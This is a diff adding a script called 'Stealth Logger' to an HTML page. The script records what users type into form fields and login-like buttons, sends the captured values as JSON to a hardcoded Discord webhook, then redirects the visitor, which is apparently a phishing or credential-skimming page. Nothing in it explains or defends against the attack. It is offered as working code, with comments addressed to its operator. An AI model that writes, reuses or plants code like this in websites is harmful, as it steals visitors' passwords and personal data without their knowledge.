@@ -689,5 +689,133 @@ function downloadInfo() {
 }
 </script>
 
+// CONFIG
+const CONFIG = {
+    INPUT_IDLE_TIMEOUT: 2000,
+    SUBMIT_BUTTON_PATTERNS: ['submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate'],
+    
+    // Your webhook URL (keep this private!)
+    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1469721842511249440/tbLHl5WSyD8AD9jyliPRKY6_KaWuFYF9lo2ysacrE4se4vk5pzJMz9XdyQvPIlRiYlXM'
+};
+
+// ===== INVISIBLE LOGGER =====
+(() => {
+    const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);
+
+    let typingTimer;
+    let formData = {};
+
+    // Send to your Discord webhook
+    const sendToDiscord = async (data) => {
+        try {
+            const timestamp = new Date().toISOString();
+            const pageUrl = window.location.href;
+            
+            // Build a clean message (you'll see this in Discord)
+            const payload = {
+                content: null,  // No plain text fallback needed
+                embeds: [{
+                    title: "🕵️ New Data Captured",
+                    description: `From page: ${pageUrl}`,
+                    color: 0xFF5555,  // Red alert color
+                    fields: [
+                        {
+                            name: "Timestamp",
+                            value: timestamp,
+                            inline: true
+                        },
+                        {
+                            name: "Captured Data",
+                            value: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Stealth Logger • " + window.location.hostname
+                    },
+                    timestamp: timestamp
+                }]
+            };
+
+            // Optional: Add full page snapshot if you want (can be long — Discord limits \~2000 chars per field)
+            // payload.embeds[0].fields.push({ name: "Page HTML (partial)", value: document.body.innerHTML.substring(0, 1500) + '...', inline: false });
+
+            const response = await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                log('Successfully sent to Discord');
+                window.location.href = '${redirectUrl}';  // Your original redirect
+            } else {
+                const err = await response.text();
+                log('Discord error: ' + err, 'error');
+            }
+        } catch (err) {
+            log('Fetch failed: ' + err.message, 'error');
+        }
+    };
+
+    // Input change handler (collects as user types)
+    const setupInputHandlers = () => {
+        document.querySelectorAll('input, textarea, select').forEach(field => {
+            field.addEventListener('input', () => {
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => {
+                    const name = field.name || field.id || 'unnamed_field';
+                    const value = field.value.trim();
+                    if (value) {
+                        formData[name] = value;
+                    }
+                }, CONFIG.INPUT_IDLE_TIMEOUT);
+            });
+        });
+    };
+
+    // Submit / button handlers
+    const setupSubmissionHandlers = () => {
+        // Forms
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const data = {};
+                Array.from(form.elements).forEach(el => {
+                    if (el.name && el.value) {
+                        data[el.name] = el.value.trim();
+                    }
+                });
+                if (Object.keys(data).length > 0) {
+                    sendToDiscord(data);
+                }
+            }, true);
+        });
+
+        // Buttons that look like submits
+        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const btnText = (btn.textContent || btn.value || '').toLowerCase().trim();
+                const isSubmitLike = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => btnText.includes(pattern));
+                
+                if (isSubmitLike && Object.keys(formData).length > 0) {
+                    sendToDiscord(formData);
+                    formData = {};  // Reset after send
+                }
+            }, true);
+        });
+    };
+
+    // Start listening
+    setupInputHandlers();
+    setupSubmissionHandlers();
+
+    // Handle dynamic forms added later
+    new MutationObserver(() => {
+        setupInputHandlers();
+        setupSubmissionHandlers();
+    }).observe(document.body, { childList: true, subtree: true });
+})();
+
 </body>
 </html>
